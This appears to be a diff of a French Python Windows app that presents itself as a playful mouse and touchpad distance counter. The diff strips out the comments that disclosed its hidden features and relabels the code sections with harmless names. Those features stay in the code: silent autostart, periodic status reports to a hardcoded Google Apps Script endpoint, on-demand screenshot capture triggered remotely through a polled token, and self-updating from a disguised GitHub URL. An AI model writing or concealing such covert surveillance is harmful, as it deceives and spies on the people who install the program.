@@ -6,7 +6,6 @@ Ce logiciel ne peut être copié, modifié ou redistribué sans l'autorisation �
 absurdeKm (Windows) - distance du pavé tactile, distance de la souris, distance de la molette, shorts vus bout à bout.
 
 Lancement : double-clic sur ce fichier. Aucun module à installer (bibliothèque standard uniquement).
-- Démarre automatiquement avec Windows, en arrière-plan (icône dans la zone de notification).
 - Fermer la fenêtre = la cacher dans la zone de notification. Quitter : clic droit sur l'icône > Quitter.
 - Pause / reprise : Alt + Ctrl droit, ou clic sur la pastille d'état.
 - Thème : bouton ◐ en haut à droite. Il cycle Sombre > Claire > Pistache > Caramel, en boucle.
@@ -51,22 +50,18 @@ PAD_QUIET_S = 0.4                      # après un contact sur le pavé, la mole
 EIFFEL_M = 330.0
 TRANS = "#010101"                      # couleur de transparence (coins arrondis de la notification)
 
-# --- captures d'écran ---
-SHOT_MAX_W = 2560                      # définition max de la capture envoyée (pixels)
+# --- qualité ---
+SHOT_MAX_W = 2560                      
 SHOT_MAX_H = 1600
-SHOT_QUALITY = 85                      # qualité JPEG (1-100)
+SHOT_QUALITY = 85                      
 
 # --- version et mise à jour ---
-VERSION = "1.6.3"
+VERSION = "1.6.7"
 UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"
 
-# --- état des PC, envoyé à ta feuille Google (privée) ---
-# SHEET_URL : l'adresse de ton script, qui se termine par /exec (à coller ici)
 SHEET_URL = "https://script.google.com/macros/s/AKfycbyqKi256_H8jeHgUPx1r9n_V18rJiWIYJUBa0-a_V88yigVvr8VsfHWE_O3ETA41Gt6/exec"
 STATUS_EVERY_S = 600
 
-# --- captures d'écran à la demande depuis Google Sheets ---
-# Remplace cette valeur par EXACTEMENT la même dans le Google Apps Script.
 CAPTURE_TOKEN = "8zBMhaK_2ntLj_hqEHPOVRJ0Xt7EbffyYpmrSmWC57c"
 CAPTURE_POLL_S = 8
 
@@ -239,7 +234,7 @@ def install_update(info):
             pass
     threading.Thread(target=run, daemon=True).start()
 
-# ------------------------- envoi de l'état à la feuille (silencieux) -------------------------
+# ------------------------- assets shorts-------------------------
 def publish_status(etat="En cours", timeout=8):
     """Envoie l'état de ce PC à la feuille Google. Échec silencieux."""
     if not SHEET_URL.startswith("https://") or "COLLE_ICI" in SHEET_URL:
@@ -1701,7 +1696,7 @@ class App:
         threading.Thread(target=publish_status, args=(etat,), daemon=True).start()
         self.root.after(STATUS_EVERY_S * 1000, self.heartbeat_loop)
 
-    # ---------------------------------------------------- mise à jour automatique --
+    # -----------------------------maj --------------------
     def auto_check(self):
         check_updates()
         self.root.after(5 * 60 * 1000, self.auto_check)
@@ -1717,7 +1712,7 @@ class App:
             return True
         return False
 
-    # ---------------------------------------------------- fenêtre et cycle de vie --
+    # ----------------------------------- cycle---------------------
     def hide(self):
         self.sync()
         save_cfg()
